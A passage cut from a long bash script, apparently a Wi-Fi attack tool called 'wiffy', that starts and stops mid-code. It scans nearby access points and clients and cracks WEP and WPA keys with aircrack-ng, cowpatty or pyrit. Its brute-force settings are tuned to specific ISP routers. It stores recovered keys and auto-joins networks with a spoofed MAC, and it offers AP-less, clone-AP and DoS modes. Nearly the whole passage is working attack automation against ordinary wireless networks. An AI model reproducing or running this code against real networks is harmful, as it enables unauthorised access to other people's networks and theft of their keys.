   if [ "$3" != "$mac" ] && [ "$3" ]; then attack "mac" "blank" "$interface" "$3"; fi
   display action "Joining: $1"
   command="service network-manager start 2>&1; NetworkManager2>&1; "
   if [ -e "/etc/init.d/wicd" ]; then command="$command /etc/init.d/wicd start2>&1 /dev/null "; fi
   action "Starting services" "$command"      # Backtrack & Ubuntu & Fedora
   sleep 1
   if [ "$encryption" == "Off" ]; then
      action "Off" "ifconfig $interface down; dhclient -r $interface; ifconfig $interface up; iwconfig $interface essid \"$1\"; iwconfig $interface mode Managed; dhclient $interface"
   elif [ "$encryption" == "WEP" ]; then
      action "WEP" "ifconfig $interface down; dhclient -r $interface; ifconfig $interface up; iwconfig $interface essid \"$1\"; iwconfig $interface key \"$2\"; iwconfig $interface mode Managed; dhclient $interface"
   elif [[ "$encryption" == *WPA* ]]; then
      action "WPA" "ifconfig $interface down; dhclient -r $interface; wpa_passphrase $1 '$2' > \"$(pwd)/tmp/wiffy.tmp\"; ifconfig $interface up; wpa_supplicant -B -i$interface -c\"$(pwd)/tmp/wiffy.tmp\" -Dwext; dhclient $interface"
      cp -f "$(pwd)/tmp/wiffy.tmp" "wpa.conf"
   fi
   sleep 5
   ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}' | head -1)
   if [ "$ourIP" ]; then if [ "$displayMore" == "true" ]; then display more "IP: $ourIP"; fi; display action "Connected!"; stage="connected";
   else display error "Failed to get an IP address!" 1>&2; fi
}
function crackKey() { #crackKey #"$essid" $bssid "$encryption"
   if [ "$debug" == "true" ]; then echo -e "crackKey~$@"; fi
   error="free" #stage="crackKey"
   if [ -z "$1" ] && [ "$wpaSoftware" == "cowpatty" ]; then error="1"
   elif [ -z "$2" ] && ([ "$wpaSoftware" == "aircrack-ng" ] || [ "$wpaSoftware" == "pyrit" ]); then error="2"
   elif [ -z "$3" ]; then error="3"; fi

   if [ "$error" != "free" ]; then
      display error "crackKey Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: crackKey (Error code: $error): $1, $2, $3" >> $logFile
      return 1
   fi

   #----------------------------------------------------------------------------------------------#
   if ([ "$3" == "WEP" ] || [[ "$3" == *WPA* ]]) && [ "$stage" != "done" ]; then
      if [ ! -e "$pathCap" ]; then display error "Something went wrong )=   [6]" 1>&2; fi
      if [ "$key" ]; then testKey "$2" "$3" "$key"; fi   # Key detected from DB
      if [ ! -e "$(pwd)/tmp/wiffy.key" ]; then            # Check to see if its been cracked
         key=""   # Key/DB was wrong.
         if [ "$3" == "WEP" ]; then
            command=$(grep "$2" "$(pwd)/tmp/wiffy-01.csv" | awk -F "," '{print $11}' | sed 's/ [ ]*//' | head -1)
            if [ "$command" ] && [ "$command" -gt "5000" ]; then action "aircrack-ng" "aircrack-ng \"$pathCap\" -b $2 -l \"$(pwd)/tmp/wiffy.key\" -a 1" "false" "0|285|30" & sleep 1;
            elif [ "$command" ] && [ "$displayMore" == "true" ]; then display error "Not enough IVs ...yet"  1>&2; fi   #AP-Less/Clone AP
         elif [[ "$3" == *WPA* ]]; then
            display action "Starting: $wpaSoftware"
            if [ "$wpaSoftware" == "aircrack-ng" ]; then command="aircrack-ng \"$pathCap\" -b $2 -l \"$(pwd)/tmp/wiffy.key\" -a 2"
            elif [ "$wpaSoftware" == "cowpatty" ]; then command="cowpatty -r \"$pathCap\" -s \"$1\""
            elif [ "$wpaSoftware" == "pyrit" ]; then command="pyrit -r \"$pathCap\" -b $2 -o \"$(pwd)/tmp/wiffy.key\""; fi
            if [ "$wpaMethod" == "wordlist" ]; then
               if [ "$wpaSoftware" == "aircrack-ng" ]; then command="$command -w $wordlist"
               elif [ "$wpaSoftware" == "cowpatty" ]; then command="$command -f $wordlist | tee \"$(pwd)/tmp/wiffy.tmp\""
               elif [ "$wpaSoftware" == "pyrit" ]; then command="$command -i \"$wordlist\" attack_passthrough"; fi
            elif [ "$wpaMethod" == "brute" ]; then
               if [[ "$1" == *virginmedia* ]]; then tmp="8 8 \"abcdefghijklmnopqrstuvwxyz\"" #  208827064576   [26^8]
               elif [[ "$1" == *BTHomeHub2* ]]; then tmp="10 10 \"0123456789abcdef\""        # 1099511627776  [16^10]
               elif [[ "$1" == *Sky* ]]; then tmp="8 8 \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\""       #  208827064576   [26^8]
               elif [[ "$1" == *2wire* ]]; then tmp="10 10 \"0123456789\""                   #   10000000000  [10^10]
               else tmp="8 13 \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\""; fi
               #tmp="11 11 0123456789 -t 0%%%%%%%%%%" #UK telephone number +44%%%%%%%%%%      #   10000000000  [10^10]
               if [ "$wpaSoftware" == "aircrack-ng" ]; then command="/pentest/passwords/crunch/crunch $tmp | $command -w-"
               elif [ "$wpaSoftware" == "cowpatty" ]; then command="/pentest/passwords/crunch/crunch $tmp | $command -f- | tee \"$(pwd)/tmp/wiffy.tmp\""
               elif [ "$wpaSoftware" == "pyrit" ]; then command="/pentest/passwords/crunch/crunch $tmp | $command -i- attack_passthrough"; fi
#elif [ "$wpaMethod" == "rainbow" ]; then
#   if [ "$wpaSoftware" == "aircrack-ng" ]; then action "aircrack-ng -r \"$(pwd)/tmp/wiffy-$essid.hash\" \"$pathCap\""
#   elif [ "$wpaSoftware" == "cowpatty" ]; then action "cowpatty -s \"$essid\" -d \"$(pwd)/tmp/wiffy-$essid.hash\" -r \"$pathCap\"; fi
            else display error "Something went wrong )=   [7]" 1>&2; fi

            if [ "$benchmark" == "true" ] && [ "$wpaMethod" == "wordlist" ] && [ "$wpaSoftware" == "aircrack-ng" ]; then
               command="$command | tee \"$(pwd)/tmp/wiffy.benchmark\""
               display action "Starting: Benchmarking"

               if [ -d "$wordlist" ]; then
                  for file in "$wordlist"*; do
                     #if [ -z "$essid" ]; then break; fi
                     tmp=$(echo $command | sed "s|$wordlist|$file|g")
                     action "$wpaSoftware" "$tmp" "false" "0|0|20" & sleep 1
                     benchmark "$file"
                     command=$(echo $tmp | sed "s|$file|$wordlist|g")
                     sleep 2
                     if [ -e "$(pwd)/tmp/wiffy.key" ]; then break; fi
                  done
               else
                  action "$wpaSoftware" "$command" "false" "0|0|20" & sleep 1
                  benchmark "$wordlist"
               fi
               #----------------------------------------------------------------------------------------------#
            fi
         fi
      fi
   fi

   #----------------------------------------------------------------------------------------------#
   while true; do
      if  [[ "$3" == *WPA* ]] && [ "$wpaSoftware" == "cowpatty" ]; then
         sleep 10
         cat -A "$(pwd)/tmp/wiffy.tmp" | grep "The PSK is" | sed -n 's/The PSK is "//p' | sed 's/\(.*\).../\1/' > $(pwd)/tmp/wiffy.key
         echo > "$(pwd)/tmp/wiffy.benchmark"
      fi
      if [[ "$3" == *WPA* ]]; then command=$(pgrep $wpaSoftware)
      else command=$(pgrep aircrack-ng); fi
      if [ -z "$command" ]; then break; fi
      sleep 3
   done

   for ((i=0; i<5; i++)); do
      if [ -e "$(pwd)/tmp/wiffy.key" ]; then break; fi
      sleep 1
   done

   if [ -e "$(pwd)/tmp/wiffy.key" ]; then wifikey=$(cat "$(pwd)/tmp/wiffy.key")
      if [ "$wifikey" ]; then echo -ne "\r\E[K\e[01;33m[i]\e[00m WiFi key: $wifikey\n"
         if [ -z "$key" ] && [ "$essid" ]; then echo -e "---------------------------------------\n      Date: $(date)\n     ESSID: $essid\n     BSSID: $bssid\nEncryption: $encryption\n       Key: $wifikey\n    Client: $client" >> "wiffy.keys"; if [ "$keepCap" == "true" ]; then echo -e "       Cap: $pathCap" >> "wiffy.keys"; fi; fi   # Not in DB, so lets add it
         if [ "$connect" == "true" ]; then connect "$essid" "$bssid" "$wifikey" "$client"; fi
      fi
   elif [[ "$3" == *WPA* ]] && [ -e "$wordlist" ] && ([ "$wpaMethod" == "wordlist" ] || [ "$wpaMethod" == "rainbow" ]); then display error "WPA: WiFi key isn't in the wordlist(s). Try wpaMethod=\"brute\"" 1>&2
   elif [[ "$3" == *WPA* ]] && [ -e "$wordlist" ] && [ "$wpaMethod" == "brute" ]; then display error "WPA: WiFi key isn't in brute's range." 1>&2
   elif [ "$3" == "WEP" ] && [ "$attackMethod" = "crack" ]; then display error "WEP: Couldn't inject" 1>&2
   elif [ "$3" != "N/A" ] && [ "$attackMethod" = "crack" ]; then display error "Something went wrong )=   [8]" 1>&2; fi

   if [ -e "$(pwd)/tmp/wiffy.key" ] || [[ "$3" == *WPA* ]] || ([ "$3" == "WEP" ] && [ "$attackMethod" = "crack" ] ); then
      action "Killing programs" "killall crunch aircrack-ng cowpatty pyrit airbase-ng airodump-ng xterm"
      stage="done"
   fi
   return 0
}
function display() { #display type "message"
   if [ "$debug" == "true" ]; then echo -e "display~$@"; fi
   error="free"; output=""
   if [ -z "$1" ] || [ -z "$2" ]; then error="1"; fi
   if [ "$1" != "action" ] && [ "$1" != "more" ] && [ "$1" != "info" ] && [ "$1" != "diag" ] && [ "$1" != "error" ]; then error="5"; fi

   if [ "$error" != "free" ]; then
      display error "display Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: display (Error code: $error): $1, $2" >> $logFile
      return 1
   fi
   #----------------------------------------------------------------------------------------------#
   if [ "$1" == "action" ];  then output="\e[01;32m[>]\e[00m"
   elif [ "$1" == "more" ];  then output="\e[01;33m[>]\e[00m"
   elif [ "$1" == "info" ];  then output="\e[01;33m[i]\e[00m"
   elif [ "$1" == "diag" ];  then output="\e[01;34m[+]\e[00m"
   elif [ "$1" == "error" ]; then output="\e[01;31m[!]\e[00m"; fi
   #elif [ "$1" == "input" ];  then output="\e[00;33m[~]\e[00m"
   #elif [ "$1" == "msg" ];    then output="\e[01;30m[i]\e[00m"
   #elif [ "$1" == "option" ]; then output="\e[00;35m[-]\e[00m"
   output="$output $2"
   echo -e "$output"

   if [ "$diagnostics" == "true" ]; then
      if [ "$1" == "action" ]; then output="[>]"
      elif [ "$1" == "more" ]; then output="[>]"
      elif [ "$1" == "info" ]; then output="[i]"
      elif [ "$1" == "diag" ]; then output="[+]"
      elif [ "$1" == "error" ]; then output="[!]"; fi
      echo -e "---------------------------------------------------------------------------------------------\n$output $2" >> $logFile
   fi
   return 0
}
function editSettings(){ #editSettings File
   if [ "$debug" == "true" ]; then echo -e "editSettings~$@"; fi
   error="free"; output=""
   if [ -z "$1" ]; then error="1"; fi

   if [ "$error" != "free" ]; then
      display error "display Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: display (Error code: $error): $1" >> $logFile
      return 1
   fi
   #----------------------------------------------------------------------------------------------#
   if [ -e "/usr/bin/gedit" ]; then eval "/usr/bin/gedit" "$1" 2> /dev/null 1> /dev/null
   elif [ -e "/usr/bin/kate" ]; then eval "/usr/bin/kate" "$1" 2> /dev/null 1> /dev/null
   elif [ -e "/opt/kde3/bin/kate" ]; then eval "/opt/kde3/bin/kate" "$1" 2> /dev/null 1> /dev/null
   elif [ -e "/usr/bin/geany" ]; then eval "/usr/bin/geany" "$1" 2> /dev/null 1> /dev/null
   elif [ -e "/bin/nano" ]; then eval "/bin/nano" "$1" 2> /dev/null 1> /dev/null
   elif [ -e "/bin/vi" ]; then eval "/bin/vi" "$1" 2> /dev/null 1> /dev/null
   else display error "Couldn't detect a text editor. You'll have to do it manually." 1>&2; fi
   return 0
}
function findAP() { #findAP
   if [ "$debug" == "true" ]; then echo -e "findAP~$@"; fi
   #----------------------------------------------------------------------------------------------#
   while true; do
      capture && for ((i=0; i<$timeAP; i++)); do echo -ne "\r\E[K\e[01;32m[>]\e[00m Scanning: Environment ($((timeAP-i)) seconds...)"; sleep 1; done && echo -ne "\r\E[K\e[01;32m[>]\e[00m Scanning: Environment\n" && action "Killing programs" "killall aircrack-ng cowpatty pyrit airbase-ng airodump-ng xterm"
      if [ ! -e "$(pwd)/tmp/wiffy-01.kismet.netxml" ]; then display error "Something went wrong )=   [1]" 1>&2; cleanUp; fi

      id=""; index="-1" # so its starts at 0   id~For -e or -b (command line inputs)
      while IFS='<>' read _ starttag value endtag; do
         case "$starttag" in
            encryption)                 index=$(($index+1)); apEncr[$index]="$value"; apClients[$index]="0"; apDB[$index]="No"; apHidden[$index]="Yes";;
            "essid cloaked=\"false\"")  apESSID[$index]="$value"; apHidden[$index]="No"; if [ "$essid" ] && [ "$essid" == "$value" ]; then id="$index"; fi;;
            BSSID)                      apBSSID[$index]="$value"; if [ "$bssid" ] && [ "$bssid" == "$value" ]; then id="$index"; fi;;
            channel)                    apChannel[$index]="$value";;
            last_signal_dbm)            apSignal[$index]="$value";;
            client-mac)                 apClients[$index]=$((apClients[$index]+1));;
            manuf)                      apManuf[$index]="$value";;
         esac
      done < "$(pwd)/tmp/wiffy-01.kismet.netxml"

      for ((i=0; i<${#apBSSID[@]}; i++)); do
         if [[ ${apEncr[${i}]} == *"WPA2 AES-CCM"* ]]; then apEncr[${i}]="WPA2(CCMP)"
         elif [[ ${apEncr[${i}]} == *"WPA2 TKIP"* ]]; then apEncr[${i}]="WPA2(TKIP)"
         elif [[ ${apEncr[${i}]} == *"WPA AES-CCM"* ]]; then apEncr[${i}]="WPA (CCMP)"
         elif [[ ${apEncr[${i}]} == *"WPA TKIP"* ]]; then apEncr[${i}]="WPA (TKIP)"
         elif [[ ${apEncr[${i}]} == *WEP* ]]; then apEncr[${i}]="WEP"
         elif [[ ${apEncr[${i}]} == *OPN* ]]; then apEncr[${i}]="Off"
         else apEncr[${i}]="???"; fi
         command=$(checkDB "${apESSID[${i}]}" "${apBSSID[${i}]}" "${apEncr[${i}]}" "true")
         if [ "$command" ]; then apDB[${i}]="Yes"; fi
         if [ "${apHidden[${i}]}" == "Yes" ]; then apESSID[${i}]="$(echo -e \"$command\" | sed -n 's/.*ESSID \*may\* be: //p' | sed -n 's/\[01\;33m\[i\].*//p' | sed 's/.$//g')"; fi   #\e\e[00m
      done

      if [ "$id" ]; then break; fi   # break loop, found AP!
      stage="menu"; loop=${#apBSSID[@]}
      while true; do
         if [ "$essid" ]; then display error "Couldn't detect ESSID ($essid)" 1>&2; fi
         if [ "$bssid" ]; then display error "Couldn't detect BSSID ($bssid)" 1>&2; fi

         if ([ "$attackMethod" == "ap" ] && [ "$crackMethod" == "online" ]) || [ "$mode" == "dos" ]; then
            echo -e "---------------------------------------------------------------------------------------------------------------------------------------------------\n| Num |              ESSID               |       BSSID       | Signal | Encryption | Clients | Chan | In DB? | Manufacture                        |\n|-----|----------------------------------|-------------------|--------|------------|---------|------|--------|------------------------------------|"
            for ((i=0; i<$loop; i++)); do
               command="|  %-2s |" # Number

               if [ ${apHidden[${i}]} == "Yes" ]; then command="$command \e[01;33m%-32s\e[00m | %-16s |" # ESSID BSSID
               else command="$command %-32s | %-16s |"; fi

               if [ ${apSignal[${i}]} -gt "-65" ] && [ ${apSignal[${i}]} != "0" ]; then command="$command  \e[01;32m%-3s\e[00m   |"   # Signal - High
               elif [ ${apSignal[${i}]} -gt "-85" ] && [ ${apSignal[${i}]} != "0" ]; then command="$command  \e[01;33m%-3s\e[00m   |" # Signal - Mid
               else command="$command  \e[01;31m%-4s\e[00m  |"; fi                                    # Signal - Low/Error

               if [[ ${apEncr[${i}]} == *WPA* ]]; then command="$command \e[01;34m%-7s\e[00m |"          # Encryption - WPA
               elif [[ ${apEncr[${i}]} == "WEP" ]]; then command="$command     \e[01;36m%-3s\e[00m    |" # Encryption - WEP
               elif [[ ${apEncr[${i}]} == "Off" ]]; then command="$command     %-4s   |"                 # Encryption - Off/Open
               else command="$command     \e[01;31m%-3s\e[00m    |"; fi                                  # Encryption - ???

               if [ ${apClients[${i}]} == "0" ] && [[ ${apEncr[${i}]} == *WPA* ]]; then command="$command    \e[01;33m%-4s\e[00m |" # Clients = *COULD* be a issue if no detected clients...
               else command="$command    %-4s |"; fi

               if [ ${apChannel[${i}]} -gt "14" ]; then command="$command  \e[01;31m%-2s\e[00m |"     # Channel - Out of range (too high)
               elif [ ${apChannel[${i}]} -lt "1" ]; then command="$command  \e[01;31m%-2s\e[00m  |"   # Channel - Out of range (too low)
               #elif [ ${apChannel[${i}]} -gt "11" ]; then command="$command  \e[01;33m%-2s\e[00m  |" # Channel - Out of range (USA limit)!
               else command="$command  %-2s  |"; fi

               if [ ${apDB[${i}]} == "Yes" ]; then command="$command   \e[01;32m%-3s\e[00m  |"       # In DB? - Have we already cracked it?
               else command="$command   %-2s   |"; fi

               command="$command  %-34s|\n"                                                           # Manufacture
               if [ "$mode" == "crack" ] || [ "$mode" == "dos" ]; then # inject = Pointless for WPA/WPA, as airpwn will not work.
                  printf "$command" "$(($i+1))" "${apESSID[${i}]}" "${apBSSID[${i}]}" "${apSignal[${i}]}" "${apEncr[${i}]}" "${apClients[${i}]}" "${apChannel[${i}]}" "${apDB[${i}]}" "${apManuf[${i}]}"
               fi
               if [ "${apHidden[${i}]}" == "Yes" ]; then apESSID[${i}]=""; fi   # NOT sure about this - could try and contiude with the SSID in the db, however this will reset it - so need do need to detect
            done
            echo "---------------------------------------------------------------------------------------------------------------------------------------------------"
         #----------------------------------------------------------------------------------------------#
         elif [ "$attackMethod" == "ap" ] && [ "$crackMethod" == "offline" ]; then
            i="0"
            echo -e "-----------------------------------------------------------------------------\n| Num |                            File                            | In DB? |\n|-----|------------------------------------------------------------|--------|"
            for f in $decodeFolder; do
               if [ "$f" != "$decodeFolder" ]; then
                  cap[${i}]="$f"; filename=$(basename $f); capDB="No"

                  command="|  %-2s | %-58s |"
                  if grep -q "$filename" "$(pwd)/wiffy.keys"; then command="$command   \e[01;32m%-4s\e[00m |\n"; capDB="Yes" # In DB? - Have we already cracked it?
                  else command="$command   %-4s |\n"; fi

                  printf "$command" "$((i+1))" "$filename" "$capDB"
                  i=$((i+1))
               fi
            done
            echo "-----------------------------------------------------------------------------"
         #----------------------------------------------------------------------------------------------#
         elif [ "$attackMethod" == "apless" ]; then
            action "Creating client list" "cat \"$(pwd)/tmp/wiffy-01.csv\" | tail -n +\$((\$(cat \$(pwd)/tmp/wiffy-01.csv | grep -n \"Station MAC\" | cut -f1 -d:)+1)) | tr '\r' '\n' > $(pwd)/tmp/wiffy-01.tmp; sed '\$d' < $(pwd)/tmp/wiffy-01.tmp > $(pwd)/tmp/wiffy-01.clients"
            if [ -e "$(pwd)/tmp/wiffy-01.clients" ]; then
               clients=($(cat "$(pwd)/tmp/wiffy-01.clients" | awk -F "," '{print $1}')); index="-1" # so its starts at 0
               echo -e "-------------------------------------------------------------------------------------------------------------------------------\n| Num |              ESSID               |       BSSID       |     Target MAC    | Broadcasting? | Encryption | Chan | In DB? |\n|-----|----------------------------------|-------------------|-------------------|---------------|------------|------|--------|"
               for ((i=0; i<${#clients[@]}; i++)); do  #For each client, do...
                  _essid=$(grep "${clients[$i]}" "$(pwd)/tmp/wiffy-01.clients" | awk -F ", " '{print $7}')
                  _bssid=$(grep "${clients[$i]}" "$(pwd)/tmp/wiffy-01.clients" | awk -F ", " '{print $6}' | sed "s/,//g" | sed 's/[ \t]*$//')
                  _mac=$(grep "${clients[$i]}" "$(pwd)/tmp/wiffy-01.clients" | awk -F "," '{print $1}')
                  if [ "$_essid" ]; then  # If ESSID is known
                     IFS=',' read -ra ADDR <<< "$_essid" some clients may be probing mutliple SSIDs, so this splits them up
                     for tmp in "${ADDR[@]}"; do
                        index=$((index+1))                # Increase counter due to new result
                        clientESSID[${index}]="$tmp"      # ESSID
                        clientBSSID[${index}]="$_bssid"   # BSSID
                        clientMAC[${index}]="$_mac"       # MAC address of client
                        clientBC[${index}]="No"           # Broadcasting? No by default - as we dont know anything different!
                        clientEncr[${index}]="???"        # Encryption. No idea!
                        clientChannel[${index}]="0"       # Channel. No idea!
                        clientDB[${index}]="No"           # In DB? No by default - as we dont know anything different!
                     done
                  else   # ESSID isn't known
                     index=$((index+1))                # Increase counter due to new result
                     clientBSSID[${index}]="$_bssid"   # BSSID
                     clientMAC[${index}]="$_mac"       # MAC address of client
                     clientBC[${index}]="No"           # Broadcasting? No by default - as we dont know anything different!
                     clientEncr[${index}]="???"        # Encryption. No idea!
                     clientChannel[${index}]="0"       # Channel. No idea!
                     clientDB[${index}]="No"           # In DB? No by default - as we dont know anything different!
                  fi
               done
               #----------------------------------------------------------------------------------------------#

               for ((i=0; i<${#clientBSSID[@]}; i++)); do  #For each client, do...
                  #----------------------------------------------------------------------------------------------#
                  if [ -z "${clientESSID[$i]}" ] && [[ "${clientBSSID[$i]}" != *"not associated"* ]]; then                                                                                  # Client knows BSSID but missing ESSID. Search APs for missing info
                     for ((index=0; index<${#apBSSID[@]}; index++)); do
                        if [ "${clientBSSID[$i]}" == "${apBSSID[$index]}" ] && [ "${apESSID[$index]}" ]; then clientESSID[$i]="${apESSID[$index]}"; fi                                     # BSSID matchs and AP has ESSID
                     done
                  fi
                  if [ -z "${clientESSID[$i]}" ] && [[ "${clientBSSID[$i]}" != *"not associated"* ]]; then                                                                                  # Client knows BSSID but missing ESSID. Search other clients for missing info
                     for ((index=0; index<${#clientBSSID[@]}; index++)); do
                        if [ "${clientBSSID[$i]}" == "${clientBSSID[$index]}" ] && [ "${clientESSID[$index]}" ]; then clientESSID[$i]="${clientESSID[$index]}"; fi                         # BSSID matchs and has other client has ESSID
                     done
                  fi
                  #----------------------------------------------------------------------------------------------#
                  if [ "${clientESSID[$i]}" ] && [[ "${clientBSSID[$i]}" == *"not associated"* ]]; then                                                                                    # Client knows ESSID but missing BSSID. Search APs for missing info
                     for ((index=0; index<${#apBSSID[@]}; index++)); do
                        if [ "${clientESSID[$i]}" == "${apESSID[$index]}" ] && [[ "${apBSSID[$index]}" != *"not associated"* ]]; then clientBSSID[$i]="${apBSSID[$index]}"; fi             # ESSID matchs and AP has BSSID
                     done
                  fi
                  if [ "${clientESSID[$i]}" ] && [[ "${clientBSSID[$i]}" == *"not associated"* ]]; then                                                                                    # Client knows ESSID but missing BSSID. Search other clients for missing info
                     for ((index=0; index<${#clientBSSID[@]}; index++)); do
                        if [ "${clientESSID[$i]}" == "${clientESSID[$index]}" ] && [[ "${clientBSSID[$index]}" != *"not associated"* ]]; then clientBSSID[$i]="${clientBSSID[$index]}"; fi # ESSID matchs and has other client has BSSID
                     done
                  fi
                  #----------------------------------------------------------------------------------------------#
                  for ((index=0; index<${#apBSSID[@]}; index++)); do
                     if [ "${clientESSID[$i]}" ] && [ "${clientESSID[$i]}" == "${apESSID[$index]}" ] && [ "${clientBSSID[$i]}" ] && [ "${clientBSSID[$i]}" == "${apBSSID[$index]}" ]; then
                        clientEncr[$i]="${apEncr[${index}]}"                    # Data which could only come from AP (if there is a AP!)
                        clientChannel[$i]="${apChannel[${index}]}"
                        clientBC[$i]="Yes"                         # BSSID and ESSID are both currently being broadcasted
                        if [ "$(checkDB \"${clientESSID[$i]}\" \"${clientBSSID[$i]}\" \"${apEncr[${index}]}\" \"true\")" ]; then clientDB[$i]="Yes"; fi        # Its broadcasting and its in the database!
                     fi
                  done
                  #----------------------------------------------------------------------------------------------#
               done

               for ((i=0; i<${#clientBSSID[@]}; i++)); do
                  command="|  %-2s | %-32s |" # Num ESSID

                  if [ -z "${clientESSID[${i}]}" ] && [[ "${clientBSSID[$i]}" == *"not associated"* ]]; then command="$command \e[01;31m%-16s\e[00m  |"         # BSSID
                  elif [[ "${clientBSSID[$i]}" == *"not associated"* ]]; then command="$command \e[01;33m%-16s\e[00m  |"
                  else command="$command %-17s |"; fi

                  command="$command %-17s |" # targetsMAC

                  if [ "${clientBC[${i}]}" == "Yes" ]; then command="$command      \e[01;32m%3s\e[00m      |"   #  Broadcasting - Is BCing & got all the data we need, Great chance!
                  elif [ "${clientESSID[${i}]}" ]; then command="$command      \e[01;33m%2s\e[00m       |  "    #              ...Maybe BC cos a known Known ESSID. Could happen. (just not 100% on encr - can guess mind you from AP data)
                  else command="$command      \e[01;31m%2s\e[00m       |  "; fi                                 #              ...Not going to happen. Not got the correct details

                  if [[ ${clientEncr[${i}]} == *WPA* ]]; then command="$command \e[01;34m%-7s\e[00m |"          # Encryption - WPA
                  elif [[ ${clientEncr[${i}]} == "WEP" ]]; then command="$command     \e[01;36m%-3s\e[00m    |" # Encryption - WEP
                  elif [[ ${clientEncr[${i}]} == "Off" ]]; then command="$command     %-4s   |"                 # Encryption - Off/Open
                  else command="$command   \e[01;31m%-3s\e[00m    |"; fi                                        # Encryption - ???

                  if [ ${clientChannel[${i}]} -gt "14" ]; then command="$command  \e[01;31m%-2s\e[00m |"        # Channel - Out of range (too high)
                  elif [ ${clientChannel[${i}]} -lt "1" ]; then command="$command  \e[01;31m%-2s\e[00m  |"      # Channel - Out of range (too low)
                  #elif [ ${clientChannel[${i}]} -gt "11" ]; then command="$command  \e[01;33m%-2s\e[00m  |"    # Channel - Out of range (USA limit)!
                  else command="$command  %-2s  |"; fi

                  if [ ${clientDB[${i}]} == "Yes" ]; then command="$command   \e[01;32m%-3s\e[00m  |\n"         # In DB? - Have we already cracked it?
                  else command="$command   %-2s   |\n"; fi

                  printf "$command" "$((i+1))" "${clientESSID[${i}]}" "${clientBSSID[${i}]}" "${clientMAC[${i}]}" "${clientBC[${i}]}" "${clientEncr[${i}]}" "${clientChannel[${i}]}" "${clientDB[${i}]}"
               done
               echo "-------------------------------------------------------------------------------------------------------------------------------"
            fi
         #----------------------------------------------------------------------------------------------#
         elif [ "$attackMethod" == "clone" ]; then
            echo -e "-------------------------------------------------------------------------------------------\n| Num |              ESSID               |       BSSID       | Encryption | Chan | In DB? |\n|-----|----------------------------------|-------------------|------------|------|--------|"
            for ((i=0; i<$loop; i++)); do
               command="|  %-2s | %-32s | %-16s |" # Num ESSID BSSID

               if [[ ${apEncr[${i}]} == *WPA* ]]; then command="$command \e[01;34m%-7s\e[00m |"          # Encryption - WPA
               elif [[ ${apEncr[${i}]} == "WEP" ]]; then command="$command     \e[01;36m%-3s\e[00m    |" # Encryption - WEP
               elif [[ ${apEncr[${i}]} == "Off" ]]; then command="$command     %-4s   |"                 # Encryption - Off/Open
               else command="$command     \e[01;31m%-3s\e[00m    |"; fi                                  # Encryption - ???


               if [ ${apChannel[${i}]} -gt "14" ]; then command="$command  \e[01;31m%-2s\e[00m |"     # Channel - Out of range (too high)
               elif [ ${apChannel[${i}]} -lt "1" ]; then command="$command  \e[01;31m%-2s\e[00m  |"   # Channel - Out of range (too low)
               #elif [ ${apChannel[${i}]} -gt "11" ]; then command="$command  \e[01;33m%-2s\e[00m  |" # Channel - Out of range (USA limit)!
               else command="$command  %-2s  |"; fi

               if [ ${apDB[${i}]} == "Yes" ]; then command="$command   \e[01;32m%-4s\e[00m |\n"      # In DB? - Have we already cracked it?
               else command="$command   %-4s |\n"; fi

               printf "$command" "$(($i+1))" "${apESSID[${i}]}" "${apBSSID[${i}]}" "${apEncr[${i}]}" "${apChannel[${i}]}" "${apDB[${i}]}"
            done
            echo "-------------------------------------------------------------------------------------------"
         #----------------------------------------------------------------------------------------------#
         else display error "Something went wrong )=   [2]" 1>&2; cleanUp; fi
         #----------------------------------------------------------------------------------------------#
         s="\e[01;35m"; n="\e[00m"; selected="$s(Selected)$n";
         online="["$s"O"$n"]n-line"; offline="O["$s"f"$n"]f-line"
         wep="\e[01;36m"; wpa="\e[01;34m"
         ap="Acc["$s"e"$n"]ss Point"; apLess="AP-["$s"l"$n"]ess"; cloneAP="["$s"C"$n"]lone AP"
         Wlist="["$s"W"$n"]ordlist"; Bforce="["$s"B"$n"]rute-force"

         if [ "$mode" == "crack" ]; then
            if [ "$crackMethod" == "online" ]; then
               if [ "$attackMethod" == "ap" ]; then command="$ap $selected, $apLess, $cloneAP"
               elif [ "$attackMethod" == "apless" ]; then command="$ap, $apLess $selected, $cloneAP"
               elif [ "$attackMethod" == "clone" ]; then command="$ap, $apLess, $cloneAP $selected"
               else display error "Something went wrong )=   [3]" 1>&2; fi

               echo -e "[-]         Target: $online $selected, $offline"
               echo -e "[-]  Attack Method: $command"
               if [ "$attackMethod" == "ap" ]; then echo -e "[-] Automatic Mode: ["$s"W"$n"]"$wep"EP"$n", "$wpa"W"$n"["$s"P"$n"]"$wpa"A/WPA2"$n", "$wep"WEP"$n" & "$wpa"WP"$n"["$s"A"$n"]"$wpa"/WPA2"$n; fi
            elif [ "$crackMethod" == "offline" ]; then
               if [ "$wpaMethod" == "wordlist" ]; then command="$Wlist $selected, $Bforce"
               elif [ "$wpaMethod" == "brute" ]; then command="$Wlist, $Bforce $selected"
               else display error "Something went wrong )=   [12]" 1>&2; fi

               echo -e "[-]         Target: $online, $offline $selected"
               echo -e "[-]  Attack Method: $command"
            fi
         elif [ "$attackMethod" == "clone" ]; then echo -e "[-] ["$s"M"$n"]anual input"; fi

         tmp="[-] Re["$s"s"$n"]can"; if [ "$i" -gt 0 ]; then tmp="$tmp or num ["$s"1"$n"-"$s"$i"$n"]"; fi
         echo -e $tmp

         while true; do
            echo -ne "\e[00;33m[~]\e[00m "; read -p "Select option: "
            if [ "$mode" == "crack" ]; then
               if [ "$crackMethod" == "online" ]; then
                  if [[ "$REPLY" =~ ^[Ee]$ ]]  && [ "$attackMethod" != "ap" ]; then attackMethod="ap"; break
                  elif [[ "$REPLY" =~ ^[Ll]$ ]] && [ "$attackMethod" != "apless" ]; then attackMethod="apless"; break
                  elif [[ "$REPLY" =~ ^[Cc]$ ]] && [ "$attackMethod" != "clone" ]; then attackMethod="clone"; break; fi
                  if [ "$attackMethod" == "ap" ]; then
                     if [[ "$REPLY" =~ ^[Ww]$ ]]; then id="WEP"; break 3
                     elif [[ "$REPLY" =~ ^[Pp]$ ]]; then id="WPA"; break 3
                     elif [[ "$REPLY" =~ ^[Aa]$ ]]; then id="all"; break 3; fi
                  fi
               elif [ "$crackMethod" == "offline" ]; then
